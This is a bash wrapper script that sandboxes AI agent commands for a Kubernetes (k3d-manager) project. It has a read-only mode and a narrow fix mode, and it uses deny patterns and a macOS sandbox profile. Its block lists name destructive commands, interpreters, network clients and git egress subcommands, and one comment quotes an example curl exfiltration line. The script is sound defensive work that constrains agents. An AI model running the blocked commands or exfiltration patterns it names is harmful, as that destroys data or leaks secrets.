#!/bin/bash
# Bash wrapper for /ask agent invocations.
# Read-only by default; fix mode (K3DM_FIX_MODE=1) unlocks specific recovery operations.
# Blocks destructive commands and out-of-scope path access in both modes.
set -euo pipefail

K3DM_REPO="${K3DM_REPO_ROOT:-${HOME}/src/gitrepo/personal/k3d-manager}"
SHOPPING_CARTS_ROOT="${K3DM_SHOPPING_CARTS_ROOT:-${HOME}/src/gitrepo/personal/shopping-carts}"
FIX_MODE="${K3DM_FIX_MODE:-0}"

_deny() {
  echo "❌ Blocked: '$*' — operation not permitted for /ask agents." >&2
  exit 1
}

_deny_scope() {
  echo "❌ Out of scope: '$*' — agents are limited to k3d-manager and shopping-cart repos." >&2
  exit 1
}

# Reconstruct the command string for pattern matching
CMD="$*"

if [[ "$FIX_MODE" == "1" ]]; then
  # ── Fix mode: allow make fix-* targets + narrow kubectl/argocd ops ───────────
  # make fix-* targets are the preferred path; raw kubectl ops remain in the
  # allowlist because make targets call kubectl in sub-processes via this sandbox.

  # make: only fix-* targets allowed; all other make invocations are blocked
  if echo "$CMD" | grep -qE '\bmake\b'; then
    if ! echo "$CMD" | grep -qE '\bmake\b.*(fix-[a-z]|file-bug)'; then
      _deny "$CMD"
    fi
  fi

  # kubectl: allow rollout restart and delete pod only
  if echo "$CMD" | grep -qE '\bkubectl\b'; then
    if echo "$CMD" | grep -qE '\bkubectl\b.*\bdelete\b' && ! echo "$CMD" | grep -qE '\bkubectl\b.*delete\s+pod'; then
      _deny "$CMD"
    fi
    if echo "$CMD" | grep -qE '\bkubectl\b.*(apply|create|edit|patch|replace|scale|cordon|drain|taint|label|annotate|expose|run\b|cp\b|exec\b|port-forward)'; then
      _deny "$CMD"
    fi
  fi

  # argocd: allow app sync only
  if echo "$CMD" | grep -qE '\bargocd\b'; then
    if ! echo "$CMD" | grep -qE '\bargocd\b.*app\s+sync'; then
      _deny "$CMD"
    fi
  fi

  # helm: still fully blocked in fix mode (too broad)
  if echo "$CMD" | grep -qE '\bhelm\b.*(install|uninstall|upgrade|rollback|delete|push|repo add|repo remove)'; then
    _deny "$CMD"
  fi

else
  # ── Read-only mode (default) ─────────────────────────────────────────────────

  # kubectl write operations
  if echo "$CMD" | grep -qE '\bkubectl\b.*(delete|apply|create|edit|patch|replace|rollout restart|scale|cordon|drain|taint|label|annotate|expose|run\b|cp\b|exec\b|port-forward|auth can-i --list)'; then
    _deny "$CMD"
  fi

  # argocd write operations
  if echo "$CMD" | grep -qE '\bargocd\b.*(app (sync|delete|create|update|set|patch)|repo (add|rm)|cluster (add|rm)|proj (create|delete))'; then
    _deny "$CMD"
  fi

  # helm write operations
  if echo "$CMD" | grep -qE '\bhelm\b.*(install|uninstall|upgrade|rollback|delete|push|repo add|repo remove)'; then
    _deny "$CMD"
  fi

  # make: no read-only make target is needed for diagnosis; recipes run arbitrary shell.
  if echo "$CMD" | grep -qE '\bmake\b'; then
    _deny "$CMD"
  fi

fi

# ── Always blocked (both modes) ───────────────────────────────────────────────

# Destructive filesystem / process commands
if echo "$CMD" | grep -qE '\b(rm|rmdir|dd|mkfs|shred|truncate|mv|chmod|chown|kill|killall|pkill)\b'; then
  _deny "$CMD"
fi

# General-purpose interpreters — bypass every denylist above, so block outright.
if echo "$CMD" | grep -qE '\b(python[0-9.]*|perl|ruby|node|deno|bun|osascript|php|lua|tclsh|Rscript|gdb|lldb)\b'; then
  _deny "$CMD"
fi

# Editors / pagers with a shell-escape (:!cmd, !cmd) — bypass the denylist above.
if echo "$CMD" | grep -qE '\b(vi|vim|view|ex|nano|emacs|pico|ed|less|more|man)\b'; then
  _deny "$CMD"
fi

# find primitives that execute or mutate; the plain read forms stay allowed.
if echo "$CMD" | grep -qE '\bfind\b.*-(exec(dir)?|delete|fprintf?|fls)\b'; then
  _deny "$CMD"
fi

# archive tools that can spawn a command per entry.
if echo "$CMD" | grep -qE '\btar\b.*(--to-command|--checkpoint-action)|\bcpio\b'; then
  _deny "$CMD"
fi

# BSD awk (macOS /usr/bin/awk) can spawn a shell via system()/pipe; block the exec forms
# while leaving stream use (awk on stdin) allowed.
if echo "$CMD" | grep -qE '\bawk\b.*(system\s*\(|\|\s*"|"\s*\|)'; then
  _deny "$CMD"
fi

# Nested shell invocation and command-prefix maskers that hide the real command.
if echo "$CMD" | grep -qE '\b(bash|sh|zsh|ksh|dash)\b\s+-c\b|\b(env|xargs|nice|nohup|timeout|sudo|command|builtin|exec|eval|watch|setsid)\b'; then
  _deny "$CMD"
fi

# Output redirection / process substitution — can write or overwrite arbitrary paths
# that the per-arg scope loop never sees (the target lives inside the -c string).
if echo "$CMD" | grep -qE '(>>?|<\()'; then
  _deny "$CMD"
fi

# Outbound network clients — the sandbox does not need general egress to troubleshoot
# (kubectl talks to the API server directly). Block them outright so a readable-file
# exfil (curl "https://x/?d=$(...)") has nowhere to send the data.
if echo "$CMD" | grep -qE '\b(curl|wget|nc|ncat|netcat|telnet|socat|ftp|scp|sftp|rsync|ssh)\b'; then
  _deny "$CMD"
fi

# Destructive git operations
if echo "$CMD" | grep -qE '\bgit\b.*(reset\s+--hard|clean\s+-f|push\s+--force|push\s+-f|branch\s+-[Dd]|rebase|cherry-pick|stash\s+drop|reflog\s+delete)'; then
  _deny "$CMD"
fi

# git subcommands that reach the network are another egress path — a reader could exfil
# readable files by pushing/cloning to an attacker remote, bypassing the client block above.
# Local read-only inspection (log/status/diff/show/rev-parse/blame/…) stays allowed.
if echo "$CMD" | grep -qE '\bgit\b.*\b(clone|fetch|pull|push|remote|ls-remote|submodule|send-pack|fetch-pack|upload-pack|request-pull|daemon)\b'; then
  _deny "$CMD"
fi
if echo "$CMD" | grep -qE '\bgit\b.*--remote\b'; then
  _deny "$CMD"
fi

# Block file access outside allowed repos (absolute path arguments only)
# Read-only system paths allowed for cluster diagnosis
_DIAG_PATHS=(
  "${HOME}/.local/share/k3d-manager"
  /var/log
  /usr/local/bin
  /usr/bin
  /bin
  /opt/homebrew
)

_canon() {
  local candidate="$1" resolved
  if resolved="$(realpath -m -- "$candidate" 2>/dev/null)"; then
    printf '%s\n' "$resolved"
  elif [[ -e "$candidate" ]] && resolved="$(realpath -- "$candidate" 2>/dev/null)"; then
    printf '%s\n' "$resolved"
  elif [[ ! "$candidate" =~ (^|/)\.\.(/|$) ]]; then
    printf '%s\n' "$candidate"
  else
    return 1
  fi
}

_profile_path() {
  local path="$1"
  if [[ "$path" == *\"* || "$path" == *\\* ]]; then
    _deny_scope "$path"
  fi
  _canon "$path"
}

_CMD="$*"
_backtick='`'
_dollar_paren="\$("
_dollar_brace="\${"
if [[ "$CMD" == *"$_backtick"* || "$CMD" == *"$_dollar_paren"* || "$CMD" == *"$_dollar_brace"* || "$CMD" =~ \$[a-zA-Z_] ]]; then
  _deny_scope "$CMD"
fi
_bare_cd='(^|[[:space:];|&])(cd|pushd)([[:space:];|&]|$)'
_unsafe_cd='(^|[[:space:];|&])(cd|pushd)[[:space:]]+(-|~)([[:space:];|&]|$)'
if [[ "$CMD" =~ $_bare_cd || "$CMD" =~ $_unsafe_cd ]]; then
  _deny_scope "$CMD"
fi

_ALLOWED=()
for _p in "${K3DM_REPO}" "${SHOPPING_CARTS_ROOT}" /tmp /var/tmp /proc /sys "${_DIAG_PATHS[@]}"; do
  if [[ -e "$_p" ]]; then
    _real_p="$(_canon "$_p")" || _deny_scope "$_p"
    _ALLOWED+=("$_real_p")
  fi
done

_scope_text="$(printf '%s' "$CMD" | sed "s/[;|&()<>\"'=]/ /g")"
read -r -a _tokens <<< "$_scope_text"
for _token in "${_tokens[@]}"; do
  if [[ "$_token" == ~* ]]; then
    _deny_scope "$_token"
  fi
  if [[ "$_token" =~ (^|/)\.\.(/|$) ]]; then
    _deny_scope "$_token"
  fi
  if [[ "$_token" == /* ]]; then
    _real_token="$(_canon "$_token")" || _deny_scope "$_token"
    _allowed=0
    for _p in "${_ALLOWED[@]}"; do
      if [[ "$_real_token" == "$_p" || "$_real_token" == "$_p/"* ]]; then
        _allowed=1
        break
      fi
    done
    if [[ "$_allowed" -eq 0 ]]; then
      _deny_scope "$_token"
    fi
  fi
done

_HOME_CANON="$(_profile_path "$HOME")" || _deny_scope "$HOME"
_REPO_CANON="$(_profile_path "$K3DM_REPO")" || _deny_scope "$K3DM_REPO"
_SHOPPING_CANON="$(_profile_path "$SHOPPING_CARTS_ROOT")" || _deny_scope "$SHOPPING_CARTS_ROOT"
_LOCAL_DATA="$(_profile_path "$HOME/.local/share/k3d-manager")" || _deny_scope "$HOME/.local/share/k3d-manager"
_KUBE="$(_profile_path "$HOME/.kube")" || _deny_scope "$HOME/.kube"
_ARGOCD="$(_profile_path "$HOME/.config/argocd")" || _deny_scope "$HOME/.config/argocd"
_HELM="$(_profile_path "$HOME/.config/helm")" || _deny_scope "$HOME/.config/helm"
_HELM_PREFS="$(_profile_path "$HOME/Library/Preferences/helm")" || _deny_scope "$HOME/Library/Preferences/helm"
_HELM_CACHE="$(_profile_path "$HOME/Library/Caches/helm")" || _deny_scope "$HOME/Library/Caches/helm"
_GITCONFIG="$(_profile_path "$HOME/.gitconfig")" || _deny_scope "$HOME/.gitconfig"
_GIT_CONFIG="$(_profile_path "$HOME/.config/git")" || _deny_scope "$HOME/.config/git"
_KUBE_CACHE="$(_profile_path "$HOME/.kube/cache")" || _deny_scope "$HOME/.kube/cache"

_profile="(version 1)
(allow default)
(deny file-read* file-write* (subpath \"$_HOME_CANON\"))
(allow file-read* (subpath \"$_REPO_CANON\") (subpath \"$_SHOPPING_CANON\")
                  (subpath \"$_LOCAL_DATA\") (subpath \"$_KUBE\")
                  (subpath \"$_ARGOCD\") (subpath \"$_HELM\")
                  (subpath \"$_HELM_PREFS\") (subpath \"$_HELM_CACHE\")
                  (literal \"$_GITCONFIG\") (subpath \"$_GIT_CONFIG\"))
(allow file-write* (subpath \"$_KUBE_CACHE\") (subpath \"$_HELM_CACHE\"))"

if [[ "$(uname -s)" == "Darwin" && "${K3DM_ASK_OS_SANDBOX:-1}" != "0" ]]; then
  if [[ ! -x /usr/bin/sandbox-exec ]]; then
    _deny "sandbox-exec is unavailable"
  fi
  exec /usr/bin/sandbox-exec -p "$_profile" /bin/bash "$@"
fi

exec /bin/bash "$@"
